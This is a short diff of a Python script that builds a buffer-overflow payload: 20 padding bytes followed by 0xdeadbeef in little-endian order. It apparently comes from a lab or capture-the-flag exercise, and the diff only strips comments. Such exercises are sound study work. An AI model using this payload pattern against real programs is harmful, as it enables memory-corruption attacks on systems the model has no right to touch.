@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
-# /tmp/make_payload.py  -- crée /tmp/payload.bin (20 'B' + 0xdeadbeef little-endian)
 
 pad = b'B' * 20
-val_bytes = b'\xef\xbe\xad\xde'   # 0xdeadbeef little-endian
+val_bytes = b'\xef\xbe\xad\xde'  
 
 payload = pad + val_bytes
 
